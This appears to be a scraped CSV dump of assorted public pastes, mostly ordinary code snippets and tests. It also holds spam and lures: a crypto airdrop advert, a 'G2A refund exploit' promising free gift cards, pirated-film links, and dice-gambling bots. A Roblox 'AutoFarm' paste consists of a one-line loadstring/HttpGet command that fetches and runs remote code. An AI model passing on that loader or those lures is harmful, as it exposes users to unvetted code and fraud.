id,title,username,language,date,content
rndy6mzG,üéÅ List of all FREE Crypto Airdrops! üéÅ,VQ-Moe,GetText,Monday 8th of January 2024 06:03:08 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://netdrop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://netdrop.netlify.app/

319642"
wYz96hUU,data807,TestGuy1,JSON,Monday 8th of January 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '843848847be696487158e9becb712f0a23e1c43110b8ffad8fe0cbcdbc42623a45418ad3d712f93246835acca960873b7dc47936db066d95550ef69d34c169ce297f0eaba933804dd587af9b5a11a4899b5dfc7c8b89a24d2998364e49b12c580f733816c6d416fe7f1229b8ff54cac57864d5ff2b39a1c10b1ca4a119c43813',
  otherdata: [
    'b14aabe2af6679320bf04b465563c773',
    'bda2a4d946a3cc07cfe7366e76c7e1c2',
    'f70984e6e1ef7bda98cb3f3d699fd3d5',
    '61a44e6d7a32e375f1e76f1403e8dbd7',
    '598204119867797923560a8fdfac310e',
    '16d9933518c392b3fbdf4fd8c9196466',
    '3dcdb1206ca017fa2c86be533ec63de1',
    '978de80586362728cf5e4770ebfc75e9'
  ]
}"
THfWcmXU,Stauffenberg.2004.Dual.Deu.ac3.Eng.eac3.1080p.h264.Subs-bp,bpmircea,BrainFuck,Monday 8th of January 2024 05:42:51 AM CDT,"Stauffenberg (Operation Valkyrie) (Jo Baier, 2004)
aka
Stauffenberg.2004.Dual.Deu.ac3.Eng.eac3.1080p.h264.Subs-bp
https://www.imdb.com/title/tt0388437/

Uploading..."
98vkR2P9,ü§ë G2A.com Refund Exploit Jan 2024 ü§ë,G2ARefundExploit,GetText,Monday 8th of January 2024 05:26:14 AM CDT,"G2A.com refund exploit updated guide 
Any item for free on G2A.com such as Amazon, Steam, and any other gift cards.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_520231.pdf
 
Working as of
08 January 2024"
0iagE0Yt,DebuggerDisplayForToString,pszczyg,C#,Monday 8th of January 2024 05:09:45 AM CDT,"[DebuggerDisplay(""{"" + nameof(ToString) +""()}"")]"
aizmh8Gi,Add Supports Script for Woocommerce Gallery,hmbashar,PHP,Monday 8th of January 2024 05:05:39 AM CDT,"function abc_woocommerce_gallery_support() {
    // Include the file for is_plugin_active() function
    include_once( ABSPATH . 'wp-admin/includes/plugin.php' );

    // Check if WooCommerce is active
    if ( is_plugin_active( 'woocommerce/woocommerce.php' ) ) {
        // Check and add theme support for each feature
        if ( ! current_theme_supports( 'wc-product-gallery-zoom' ) ) {
            add_theme_support( 'wc-product-gallery-zoom' );
        }
        if ( ! current_theme_supports( 'wc-product-gallery-slider' ) ) {
            add_theme_support( 'wc-product-gallery-slider' );
        }
        if ( ! current_theme_supports( 'wc-product-gallery-lightbox' ) ) {
            add_theme_support( 'wc-product-gallery-lightbox' );
        }
    }
}

add_action( 'after_setup_theme', 'abc_woocommerce_gallery_support' );"
UykFSkrw,VerboseCollectionAssertTests,pszczyg,C#,Monday 8th of January 2024 05:04:30 AM CDT,"[TestFixture]
internal class VerboseCollectionAssertTests
{
    [DebuggerDisplay(""{"" + nameof(Name) +""}"")]
    class VerboseClass
    {
        public string Name { get; set; }

        public override string ToString()
        {
            return Name;
        }
    }

    [Test]
    public void CompareVerboseCollections()
    {
        var expectedCollection = new List<VerboseClass>
        {
            new VerboseClass{ Name = ""ExpectedName1"" },
            new VerboseClass{ Name = ""ExpectedName2"" },
        };

        var actualCollection = new List<VerboseClass>
        {
            new VerboseClass{ Name = ""ActualName1"" },
            new VerboseClass{ Name = ""ActualName2"" },
        };

        CollectionAssert.AreEquivalent(expectedCollection, actualCollection);
    }
}"
k9m6wLJJ,C#_2_name_output,Legiomax,C#,Monday 8th of January 2024 05:04:04 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace C_Ijun
{
    internal class Program
    {
        static void Main(string[] args)
        {
            char userSymbol;

            string userName;
            string stringByUserSymbol;

            Console.Write(""–í—ã–≤–æ–¥ –∏–º–µ–Ω–∏.\n–í–≤–µ–¥–∏—Ç–µ –∏–º—è: "");
            userName = Console.ReadLine();

            Console.Write(""–í–≤–µ–¥–∏—Ç–µ 1 —Å–∏–º–≤–æ–ª: "");
            userSymbol = Convert.ToChar(Console.ReadLine());

            stringByUserSymbol = Convert.ToString(userSymbol);

            for (int i = 0; i <= userName.Length; i++)
            {
                stringByUserSymbol += userSymbol;
            }

            Console.Write($""{stringByUserSymbol}\n{userSymbol}{userName}{userSymbol}\n{stringByUserSymbol}"");
            Console.ReadLine();
        }
    }
}


"
hDkShhgh,SimpleCollectionAssertTests,pszczyg,C#,Monday 8th of January 2024 04:53:02 AM CDT," [TestFixture]
 internal class SimpleCollectionAssertTests
 {
     class SimpleClass
     {
         public string Name { get; set; }
     }

     [Test]
     public void CompareSimpleCollections()
     {
         var expectedCollection = new List<SimpleClass>
         {
             new SimpleClass{ Name = ""ExpectedName1"" },
             new SimpleClass{ Name = ""ExpectedName2"" },
         };

         var actualCollection = new List<SimpleClass>
         {
             new SimpleClass{ Name = ""ActualName1"" },
             new SimpleClass{ Name = ""ActualName2"" },
         };

         CollectionAssert.AreEquivalent(expectedCollection, actualCollection);
     }
 }"
jgpdy45w,SecurityConfig.java,xXGoziXx,Java,Monday 8th of January 2024 04:28:06 AM CDT,"package com.SmartHealthcare.configs;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.dao.DaoAuthenticationProvider;
import org.springframework.security.config.annotation.authentication.configuration.AuthenticationConfiguration;
import org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;

import com.SmartHealthcare.helpers.UserDetailsServiceImpl;

@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {

    @Autowired
    JwtAuthFilter jwtAuthFilter;

    @Bean
    public UserDetailsService userDetailsService() {
        return new UserDetailsServiceImpl();
    }

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        return http.csrf(csrf -> csrf.disable())
                .authorizeHttpRequests(requests -> requests.anyRequest().permitAll())
                // .authorizeHttpRequests(requests -> requests
                //         .requestMatchers(""/api/user/register"", ""/api/user/login"",
                //                 ""/api/user/refreshToken"",
                //                 ""/api/user/gender"", ""/api/user/roles"", ""/api/patient/**"",
                //                 ""/api/doctor/register"")
                //         .permitAll())
                .authorizeHttpRequests(requests -> requests.requestMatchers(""/api/**"")
                        .authenticated())
                .sessionManagement(management -> management
                        .sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                .authenticationProvider(authenticationProvider())
                .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class).build();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    public AuthenticationProvider authenticationProvider() {
        DaoAuthenticationProvider authenticationProvider = new DaoAuthenticationProvider();
        authenticationProvider.setUserDetailsService(userDetailsService());
        authenticationProvider.setPasswordEncoder(passwordEncoder());
        return authenticationProvider;

    }

    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration config) throws Exception {
        return config.getAuthenticationManager();
    }

}"
civwsM7D,Untitled,sissou123,PHP,Monday 8th of January 2024 04:24:24 AM CDT," 2023 PHP for Beginners Part 1: every line fully explained
PHP for Beginners: Learn to Code in PHP. Every line of code explained in detail. A true PHP for Beginners Course 2023
 
Students consistently say how much they LOVE this course due to its unique delivery method and challenges which enable you to use your new skills immediately. Join over 8000 other students who have successfully learnt to code in PHP by enrolling in this course. 
for more:https://dz-linkk.com/xbXit
"
g4Jaj0C2,Heh? i2c?,silver2row,Python,Monday 8th of January 2024 04:21:51 AM CDT,"#!/usr/bin/python3

# from docs.beagleboard.org and the BeagleBone-Cookbook 

import time
import smbus

ms = 1000
bus = smbus.SMBus(1)
addr = 0x28

while True:
    data = bus.read_byte_data(addr, 0)
    print(""Gas per ______ "" + str(data))
    time.sleep(ms/1000)"
huVrJaFM,Untitled,sissou123,PHP,Monday 8th of January 2024 04:19:36 AM CDT,"The Complete 2023 PHP Full Stack Web Developer Bootcamp
Learn to build websites with HTML , CSS , JAVASCRIPT , Bootstrap , PHP , MySQL , WordPress , OOP & more! 
for more:https://dz-linkk.com/Yw6pV6
"
XTZRupJe,test 6 - 2022-2023 - –ü—Ä–µ–±—Ä–æ—è–≤–∞–Ω–µ –Ω–∞ –æ–±–ª–∞—Å—Ç–∏,D_L3,C++,Monday 8th of January 2024 03:53:53 AM CDT,"#include <cmath>
#include <cstdio>
#include <vector>
#include <iostream>
#include <algorithm>
#include <unordered_map>
#include <set>

using namespace std;

void dfs(unordered_map<int, set<int>>& graph, vector<bool>& visited, int start){
    visited[start] = true;
    for(int neighbour : graph[start]){
        if(!visited[neighbour])
            dfs(graph, visited, neighbour);
    }
}

int test(){
    int x, y, a, b;
    cin >> x >> y;
    vector<bool> visited(x, false);
    unordered_map<int, set<int>> graph;
    for(int i = 0; i < y; i++){
        cin >> a >> b;
        graph[a].insert(b);
        graph[b].insert(a);
    }
    
    int counter = 0;
    for(int i = 0; i < x; i++){
        if(!visited[i]){
            counter++;
            dfs(graph, visited, i);
        }
    }
    return counter;
}

int main() {
    int t;
    cin >> t;
    for(int i = 0; i < t; i++){
        cout << test() << "" "";
    }
    return 0;
}
"
ExuuBj2a,Cursed C++ Undefined Behavior,Kaelygon,C++,Monday 8th of January 2024 03:51:58 AM CDT,"#include <stdio.h>

struct Undef {
public:
	Undef(){
		width++; //set type width. This is how much the address shifts using ++ --
	}
	bool* addr=0x0; //store data in form of address
	bool* width=0x0; 
	void inc(){
		addr++;
	}
	void dec(){
		addr--;
	}
	bool* operator()(){
		return addr;
	}
};


class Constants{
public:
	Constants(){ //set constants
		placeholder.addr--;
		inf=placeholder.addr;
	}
	Undef placeholder;
	
	bool* zero=0x0;
	bool* inf=0x0;
};


class UndefMngr{
public:
	Constants vof;
	Undef add(Undef num){
		Undef inc=num;
		while(inc.addr>vof.zero){
			num.inc();
			inc.dec();
		}
		return num;
	}
	Undef sq(Undef num){ //doubling
		Undef inc=num;
		while((void*)inc.addr>vof.zero){
			num=add(num);
			inc.dec();
		}
		return num;
	}
	Undef sq16(Undef num){ //doubling double
		Undef inc=num;
		while((void*)inc.addr>vof.zero){
			num=sq(num);
			inc.dec();
		}
		return num;
	}
	Undef sub(Undef value, Undef subtractor){ //subtract
		Undef dec=subtractor;
		while((void*)dec.addr>vof.zero){
			value.dec();
			dec.dec();
		}
		return value;
	}
};

int main(){

	UndefMngr math;
	Undef num;

	printf(""Zero %p\n"", (void*)math.vof.zero );
	printf(""Infinity %p\n"", (void*)math.vof.inf );

	printf(""width %p\n"", (void*)num.width );
	num.inc();
	printf(""num+1 %p\n"", (void*)num.addr );
	num=math.sq(num);
	printf(""num doubled %p\n"", (void*)num.addr );
	Undef num2 = num;
	num=math.sq16(num);
	printf(""num doubled double %p\n"", (void*)num.addr );

	Undef result = math.sub(num,num2);
	printf(""subtracted %p from %p resulting in %p\n"", (void*)num.addr, (void*)num2.addr, (void*)result.addr );


	return 0;
}
/*Output

Zero (nil)
Infinity 0xffffffffffffffff
width 0x1
num+1 0x1
num doubled 0x2
num doubled double 0x800
subtracted 0x800 from 0x2 resulting in 0x7fe
*/"
Khjtuqfd,demo.py,ridwan100,Python,Monday 8th of January 2024 03:33:36 AM CDT,"# -*- encoding: utf-8 -*-
import argparse
import copy
import json
from pathlib import Path
import warnings

import cv2
import numpy as np
import torch
import torch.nn.functional as F
from networks.paperedge import GlobalWarper, LocalWarper, WarperUtil
# Suppress the torch.meshgrid warning
warnings.filterwarnings(""ignore"", category=UserWarning, module=""torch.functional"")
cv2.setNumThreads(0)
cv2.ocl.setUseOpenCL(False)


def load_img(img_path):
    im = cv2.imread(img_path).astype(np.float32) / 255.0
    im = im[:, :, (2, 1, 0)]
    im = cv2.resize(im, (256, 256), interpolation=cv2.INTER_AREA)
    im = torch.from_numpy(np.transpose(im, (2, 0, 1)))
    return im


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--Enet_ckpt', type=str,
                        default='models/G_w_checkpoint_13820.pt')
    parser.add_argument('--Tnet_ckpt', type=str,
                        default='models/L_w_checkpoint_27640.pt')
    parser.add_argument('--img_path', type=str, default='images/3.jpg')
    parser.add_argument('--out_dir', type=str, default='output')
    args = parser.parse_args()

    img_path = args.img_path
    dst_dir = args.out_dir
    Path(dst_dir).mkdir(parents=True, exist_ok=True)

    netG = GlobalWarper().to('cuda')
    netG.load_state_dict(torch.load(args.Enet_ckpt)['G'])
    netG.eval()

    netL = LocalWarper().to('cuda')
    netL.load_state_dict(torch.load(args.Tnet_ckpt)['L'])
    netL.eval()

    warpUtil = WarperUtil(64).to('cuda')

    gs_d, ls_d = None, None
    with torch.no_grad():
        x = load_img(img_path)
        x = x.unsqueeze(0)
        x = x.to('cuda')
        d = netG(x)  # d_E the edged-based deformation field
        d = warpUtil.global_post_warp(d, 64)
        gs_d = copy.deepcopy(d)

        d = F.interpolate(d, size=256, mode='bilinear', align_corners=True)
        y0 = F.grid_sample(x, d.permute(0, 2, 3, 1), align_corners=True)
        ls_d = netL(y0)
        ls_d = F.interpolate(ls_d, size=256, mode='bilinear', align_corners=True)
        ls_d = ls_d.clamp(-1.0, 1.0)

    im = cv2.imread(img_path).astype(np.float32) / 255.0
    im = torch.from_numpy(np.transpose(im, (2, 0, 1)))
    im = im.to('cuda').unsqueeze(0)

    gs_d = F.interpolate(gs_d, (im.size(2), im.size(3)), mode='bilinear', align_corners=True)
    gs_y = F.grid_sample(im, gs_d.permute(0, 2, 3, 1), align_corners=True).detach()
    tmp_y = gs_y.squeeze().permute(1, 2, 0).cpu().numpy()
    cv2.imwrite(f'{dst_dir}/result_gs.png', tmp_y * 255.)

    ls_d = F.interpolate(ls_d, (im.size(2), im.size(3)), mode='bilinear', align_corners=True)
    ls_y = F.grid_sample(gs_y, ls_d.permute(0, 2, 3, 1), align_corners=True).detach()
    ls_y = ls_y.squeeze().permute(1, 2, 0).cpu().numpy()
    cv2.imwrite(f'{dst_dir}/result_ls.png', ls_y * 255.)
"
SNArxRp3,doc3d.py,ridwan100,Python,Monday 8th of January 2024 03:32:44 AM CDT,"import cv2
import numpy as np
import scipy.interpolate
import os
import csv
import torch
import torch.nn as nn
import torch.nn.functional as F
from torch.utils.data import Dataset, DataLoader
from scipy.io import loadmat
import random
import time
import matplotlib.pyplot as plt
from hdf5storage import loadmat

import kornia.augmentation as KA
import kornia.geometry.transform as KG
os.environ[""OPENCV_IO_ENABLE_OPENEXR""] = ""1""
class Doc3D(Dataset):
    def __init__(self, root_dir, is_train=True, num=0):
        super(Doc3D, self).__init__()
        # self.is_train = is_train
        self.num = num
        # load the list of doc3d images
        if is_train:
            with open('/home/ridwan/thesis/PaperEdge/doc3d_root/doc3d_train.txt', 'r') as fid:
                self.X = fid.read().splitlines()
        else:
            with open('/home/ridwan/thesis/PaperEdge/doc3d_root/doc3d_val.txt', 'r') as fid:
                self.X = fid.read().splitlines()
        self.X = [root_dir + '/img/' + t + '.png' for t in self.X]
        
        # load the background images
        with open('bgtex.txt', 'r') as fid:
            self.bgtex = fid.read().splitlines()        

    def __len__(self):
        if self.num:
            return self.num
        else:
            return len(self.X)

    def __getitem__(self, index):
        index = index % 10
        t = self.X[index]
        t1 = '/home/ridwan/thesis/doc3D-renderer/tex/000752a1-1637-4256-83fd-62ce48f5f88b(1).jpg'
        t2= '/home/ridwan/thesis/PaperEdge/output/result_ls.png'
        print(t)
        im = cv2.imread(t).astype(np.float32) / 255.0
        im = im[..., ::-1]
        plt.figure(figsize=(12, 8))

        # Original Image
        plt.subplot(2, 3, 1)
        im = cv2.imread(t).astype(np.float32) / 255.0
        im = im[..., ::-1]
        plt.imshow(im)
        plt.title('Curved Image')
        plt.subplot(2, 3, 2)
        im1 = cv2.imread(t1).astype(np.float32) / 255.0
        im1 = im1[..., ::-1]
        plt.imshow(im1)
        plt.title('badlad image')

        # Image 2
        plt.subplot(2, 3, 3)
        im2 = cv2.imread(t2).astype(np.float32) / 255.0
        im2 = im2[..., ::-1]
        plt.imshow(im2)
        plt.title('flattend image')

        t = t.replace('/img/', '/wc/')
        t = t[:-3] + 'exr'
        wc = cv2.imread(t, cv2.IMREAD_ANYDEPTH | cv2.IMREAD_UNCHANGED).astype(np.float32)

        t = t.replace('/wc/', '/bm/')
        t = t[:-3] + 'mat'
        bm = loadmat(t)['bm']
        plt.subplot(2, 3, 4)

        x_coords = bm[:, :, 0]
        y_coords = bm[:, :, 1]

        # Flatten the coordinates to 1D arrays
        flat_x_coords = x_coords.flatten()
        flat_y_coords = y_coords.flatten()

        # Remove NaN values (optional, depending on your requirements)
        valid_indices = ~np.isnan(flat_x_coords)
        flat_x_coords = flat_x_coords[valid_indices]
        flat_y_coords = flat_y_coords[valid_indices]

        # Plot using scatter plot
        plt.scatter(flat_x_coords, flat_y_coords, s=1)  # Adjust the marker size (s) as needed
        plt.title('Scatter Plot of Coordinates')
        plt.xlabel('X-coordinate')
        plt.ylabel('Y-coordinate')
        plt.show()        # print(bm)
        
        # random sample a background image
        ind = random.randint(0, len(self.bgtex) - 1)
        bg = cv2.imread(self.bgtex[ind]).astype(np.float32) / 255.0
        bg = cv2.resize(bg, (200, 200))
        bg = np.tile(bg, (3, 3, 1))

        im = torch.from_numpy(im.transpose((2, 0, 1)).copy())
        wc = torch.from_numpy(wc.transpose((2, 0, 1)).copy())
        bm = torch.from_numpy(bm.transpose((2, 0, 1)).copy())
        bg = torch.from_numpy(bg.transpose((2, 0, 1)).copy())

        return im, wc, bm, bg



class Doc3DDataAug(nn.Module):
    def __init__(self):
        super(Doc3DDataAug, self).__init__()
        self.cj = KA.ColorJitter(0.1, 0.1, 0.1, 0.1)
    
    def forward(self, img, wc, bm, bg):
        # tight crop
        mask = (wc[:, 0] != 0) & (wc[:, 1] != 0) & (wc[:, 2] != 0)
        
        B = img.size(0)
        c = torch.randint(20, (B, 5))
        img_list = []
        bm_list = []
        for ii in range(B):
            x_img = img[ii]
            x_bm = bm[ii]
            x_msk = mask[ii]
            y, x = x_msk.nonzero(as_tuple=True)
            minx = x.min()
            maxx = x.max()
            miny = y.min()
            maxy = y.max()
            x_img = x_img[:, miny : maxy + 1, minx : maxx + 1]
            x_msk = x_msk[None, miny : maxy + 1, minx : maxx + 1]

            # padding
            x_img = F.pad(x_img, c[ii, : 4].tolist())
            x_msk = F.pad(x_msk, c[ii, : 4].tolist())

            x_bm[0, :, :] = (x_bm[0, :, :] - minx + c[ii][0]) / x_img.size(2) * 2 - 1
            x_bm[1, :, :] = (x_bm[1, :, :] - miny + c[ii][2]) / x_img.size(1) * 2 - 1

            # replace bg
            if c[ii][-1] > 2:
                x_bg = bg[ii][:, :x_img.size(1), :x_img.size(2)]
            else:
                x_bg = torch.ones_like(x_img) * torch.rand((3, 1, 1), device=x_img.device)
            x_msk = x_msk.float()
            x_img = x_img * x_msk + x_bg * (1. - x_msk)

            # resize
            x_img = KG.resize(x_img[None, :], (256, 256))
            img_list.append(x_img)
            bm_list.append(x_bm)
        img = torch.cat(img_list)
        bm = torch.stack(bm_list)
        # jitter color
        img = self.cj(img)
        return img, bm


if __name__ == '__main__':
    dt = Doc3D(root_dir='/home/ridwan/thesis/PaperEdge/doc3d_root')
    from visdom import Visdom
    vis = Visdom(port=8097)
    x, xt, y, yt, t = dt[999]

    vis.image(x.clamp(0, 1), opts={'caption': 'x'}, win='x')
    vis.image(xt.clamp(0, 1), opts={'caption': 'xt'}, win='xt')
    vis.image(y.clamp(0, 1), opts={'caption': 'y'}, win='y')
    vis.image(yt.clamp(0, 1), opts={'caption': 'yt'}, win='yt')
    vis.image(t, opts={'caption': 't'}, win='t')
"
yt93fZVG,test 6 - 2022-2023 - –¶–∏–∫–ª–∏—á–µ–Ω –≥—Ä–∞—Ñ,D_L3,C++,Monday 8th of January 2024 03:30:37 AM CDT,"#include <cmath>
#include <cstdio>
#include <vector>
#include <iostream>
#include <algorithm>
#include <unordered_map>

using namespace std;

bool hasCycle(unordered_map<int, vector<int>>& graph, vector<bool>& visited, vector<bool> pathVisited, int idx) {
    if(pathVisited[idx])
        return true;
    pathVisited[idx] = true;
    for(auto neighbour : graph[idx]){
        if(hasCycle(graph, visited, pathVisited, neighbour))
            return true;
    }
    pathVisited[idx] = false;
    visited[idx] = true;
    return false;
    
}

bool test(){
    int v, e, x, y, w;
    cin >> v >> e;
    unordered_map<int, vector<int>> graph;
    for(int i = 0; i < e; i++){
        cin >> x >> y >> w;
        graph[x - 1].push_back(y - 1);
    }
    vector<bool> visited(v, false);
    
    for(int i = 0; i < v; i++) {
        if(!visited[i]){
            vector<bool> pathVisited(v, false);
            if(hasCycle(graph, visited, pathVisited, i)){
                return true;
            }
        }
    }
    return false;
}


int main() {
    int n;
    cin >> n;
    for(int i = 0; i < n; i++){
        if(test())
            cout << ""true"" << "" "";
        else
            cout << ""false"" << "" "";
    }
    return 0;
}
"
4xqNjE1G,Untitled,aregrubb,Lua,Monday 8th of January 2024 03:07:19 AM CDT,"-- √Öpne tekstfilen i skrive-modus
local file = fs.open(""inspect.txt"", ""w"")
 
-- Loop gjennom alle retningene og inspiser blokker
for dir = 0, 3 do
  turtle.turnRight()
  local success, data = turtle.inspect()
  if success then
    local info = string.format(""Blokk i retning %d: %s"", dir, textutils.serialize(data))
    file.writeLine(info)
  end
end
 
-- Lukk tekstfilen
file.close()
 
-- Gi beskjed om at inspeksjonen er ferdig
print(""Inspeksjon fullf√∏rt. Data lagret i inspect.txt"")"
rcGGy2cp,for the hacker,coinwalk,JavaScript,Monday 8th of January 2024 02:50:48 AM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var dived = 240; 
var base = (oldestbal/dived).toFixed(8); 
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.9);
var lower = 2.9;
var upper = 6.9;
var muck = muck = false;
var fart = ((Math.floor(oldestbal/tens))*tens);
var james = oldestbal 
var betnext = ((botplus*1).toFixed(8));
 
 
function get(){
console.clear();
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))) {
    botplus = Number((botplus*2).toFixed(8));
    upper = 4.9;
    lower = 4.9;
    fart = parseFloat(bellance);
}
if ((bellance<(fart-(botplus*lower)))&&(bellance>james)) {
    botplus = Number((botplus*2).toFixed(8));
    upper = 4.9;
    lower = 4.9;
    fart = parseFloat(bellance);
}
if (((base*10)>=botplus)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<=oldestbal )) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    james = parseFloat(bellance);
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if (((base*10)>=botplus)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance>oldestbal )) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if (((james-(base*10))>=(bellance-(botplus*2)))&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
    james = parseFloat(bellance);
}
if (bellance>=(trget*24)) {
console.log(""winner winner chicken dinner"");
return
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_lo').click();
setTimeout(() => get(), 350);
}
get();"
sRq6Rqnn,for the hacker,coinwalk,JavaScript,Monday 8th of January 2024 02:48:22 AM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var dived = 240; 
var base = (oldestbal/dived).toFixed(8); 
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.9);
var lower = 2.9;
var upper = 6.9;
var muck = muck = false;
var fart = ((Math.floor(oldestbal/tens))*tens);
var james = oldestbal 
var betnext = ((botplus*1).toFixed(8));
 
 
function get(){
console.clear();
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))) {
    botplus = Number((botplus*2).toFixed(8));
    upper = 4.9;
    lower = 4.9;
    fart = parseFloat(bellance);
}
if ((bellance<(fart-(botplus*lower)))&&(bellance>james)) {
    botplus = Number((botplus*2).toFixed(8));
    upper = 4.9;
    lower = 4.9;
    fart = parseFloat(bellance);
}
if (((base*10)>=botplus)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))&&(belance<=oldestbal)) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    james = parseFloat(bellance);
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if (((base*10)>=botplus)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))&&(belance>oldestbal)) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if (((james-(base*10))>=(bellance-(botplus*2)))&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
    james = parseFloat(bellance);
}
if (bellance>=(trget*24)) {
console.log(""winner winner chicken dinner"");
return
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_lo').click();
setTimeout(() => get(), 350);
}
get();"
Q8XsJY2x,Untitled,sissou123,JavaScript,Monday 8th of January 2024 02:21:06 AM CDT,"The Complete JavaScript Course 2024: From Zero to Expert!
The modern JavaScript course for everyone! Master JavaScript with projects, challenges and theory. Many courses in one! 
JavaScript is the most popular programming language in the world. It powers the entire modern web. It provides millions of high-paying jobs all over the world.

That's why you want to learn JavaScript too. And you came to the right place 
for more:https://cuty.io/2yq7qiFp5q
"
1jmMf69r,reading ulepszony,Cypseu,Lua,Monday 8th of January 2024 01:57:12 AM CDT,"-- Set up the modem
local modem = peripheral.wrap(""left"")  -- Adjust the side if necessary
modem.open(2)  -- Open on channel 2
 
local monitor = peripheral.wrap(""right"")
monitor.clear()
local y = 1
monitor.setCursorPos(1,1)

-- Function to listen for messages
local function listenForMessages()
    while true do
        -- Wait for a message
        local _, _, senderChannel, replyChannel, message, _ = os.pullEvent(""modem_message"")
 
        -- Check if the message is on channel 2
        if senderChannel == 2 then
            -- Print the received message
			monitor.setCursorPos(1,y)
            monitor.write(message)
			y = y + 1
        end
    end
end
 
parallel.waitForAny(listenForMessages, function()

	while true do
		if redstone.getInput(""top"") ~= 0 then
			modem.open(1)
			modem.transmit(1,1,""stop"")
			monitor.setCursorPos(1,y)
			monitor.write(""Redstone signal received!"")
			y = y + 1
			monitor.setCursorPos(1,y)
			monitor.write(""Stopping the turtle..."")
			y = y + 1
			break
		end
	end
end)
 
-- Start the message listening function"
Vify6Xs6,Einer.von.Uns.2015.Deu.720p.h264.aac.Eng.HardSub-bp,bpmircea,BrainFuck,Monday 8th of January 2024 01:49:56 AM CDT,"Einer von uns (One of Us) (Stephan Richter, 2015)
aka
Einer.von.Uns.2015.Deu.720p.h264.aac.Eng.HardSub-bp
https://www.imdb.com/title/tt4939866/

http://up-4.net/d/sVEa
https://filecrypt.cc/Container/0D9C769874.html
https://t.me/DeuFree/1472

Audio tracks: de-AT | Subtitles: en(HardSub)"
N4QzuL0H,Pet Simulator 99! üéâ AutoFarm Script (Bypass Vip),Project-WD,Lua,Monday 8th of January 2024 01:12:48 AM CDT,"-- Pet Simulator 99! üéâ AutoFarm Script! (Copy & Paste into Executor)(Executors: Delta & ArceusX etc.)
-------------------------------------------------------
-- üÜï Updated (08/01/2024) (Insane Script)
-- Scriptüìù:
loadstring(game:HttpGet(""https://raw.githubusercontent.com/REDzHUBz/PetSimulator99/main/redz9999.lua"" ))()"
TXUjiPUZ,News Jan7 24,Newscaster_Ned,Email,Sunday 7th of January 2024 10:21:30 PM CDT,".‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé1‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
